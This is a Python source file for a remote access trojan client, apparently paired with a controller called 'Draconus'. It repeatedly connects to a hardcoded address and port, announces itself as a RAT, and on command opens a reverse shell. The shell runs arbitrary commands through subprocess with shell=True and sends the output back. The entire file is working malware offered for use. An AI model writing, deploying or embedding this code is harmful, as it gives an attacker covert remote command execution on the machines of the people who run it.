import socket
import subprocess
import os

SERVER = '192.168.100.16'
PORT = 5050
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

# length of message (256 bytes)
RAW_LEN = 256


# length of response message (1 bytes)
RAW_ERROR = 1

# response message OK
RAW_NoE = '0'.encode(FORMAT)


TYPE_RAT = 'RAT'

# message to disconnect
MSG_DISC = 'DISCONNECT'


# message to start shell
SHELL_START = 'SHELL START'

# message to exit the shell
SHELL_EXIT = 'EXIT'



# This class prepare message to send via TCP
class Msg:
    def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
        if msg == '':
            self.pmsg = '0'
        else:
            self.pmsg = msg
        self.formats = formats
        if len(msg) > raw_len:
            self.raw_len = len(msg)
        else:
            self.raw_len = raw_len
        
        self.msg = self.make(self.pmsg)
        self.len = self.make(len(self.pmsg), raw_len=self.raw_len)
      

    def make(self, msg, raw_len=None):
        nmsg = str(msg).encode(self.formats)
        if len(nmsg) < RAW_LEN:
            raw_len = RAW_LEN
        else:
            raw_len = self.raw_len
        while len(nmsg) < raw_len:
            nmsg += b' '
        return nmsg


class Rat:
    def __init__(self):
        self.RAT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_connected = False
    
    def connect(self):
        while self.is_connected == False:
            try:
                self.RAT.connect(ADDR)
                self.is_connected = True
            except:
                continue



    # send default pocket (message) to Draconus and recive response (1 bytes)
    # default length is 256 bytes
    def send_pocket(self, msg):
        send = Msg(msg)
        try:
            self.RAT.send(send.msg)
        except:
            pass
        try:
            responde = self.RAT.recv(RAW_ERROR)
            return responde
        except:
            return 0


    # recive standard pocket (message) and send response (1 bytes)
    # default length is 256 bytes
    def recive_pocket(self):
        output = None
        try:
            rec = self.RAT.recv(RAW_LEN)
        except:
            return 0
        if rec:
            rec = rec.decode(FORMAT).rstrip(' ')
            output = rec
        try:
            self.RAT.send(RAW_NoE)
        except:
            pass
        return output

    
    
    
    # Send output (message) to Draconus
    # first: send length of message
    # second: send message
    def send_output(self, msg):
        send = msg.encode(FORMAT)
        len_send = str(len(send))
        self.send_pocket(len_send)
        self.RAT.send(send)

    # identification of the worm
    def hello_world(self):
        self.send_pocket(TYPE_RAT)

 
 

    
    def recive_orders(self):
        order = None
        while order != MSG_DISC:
            order = self.recive_pocket()
            if order:
                if order == SHELL_START:
                    self.reverse_cmd()
                else:
                    self.send_pocket('Unknown Command')

    # Reverse SHELL with emulated "cd" Change Directory function
    def reverse_cmd(self):
        self.send_pocket('SHELL starting ...')
        command = None
        while command != SHELL_EXIT:
            cwd = os.getcwd()
            self.send_pocket(cwd)
            command = self.recive_pocket()
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    self.send_output('Change Directory Sucessfull !!!')
                    continue
                except:
                    self.send_output(' ERROR when < change directory function >')
                    continue
            output = self.run_cmd(command)
            self.send_output(output)


    # Run SHELL command and capture output
    def run_cmd(self, command):
        try:
            out = subprocess.run(command, shell=True, capture_output=True, text=True)

            if out.returncode == 0:            
                return out.stdout

            else:
                error = 'ERROR:\n' + out.stderr
                return error
                
        except:
            out = 'Error'
            return out



        


#### START
RAT = Rat()
RAT.connect()
RAT.hello_world()

RAT.recive_orders()





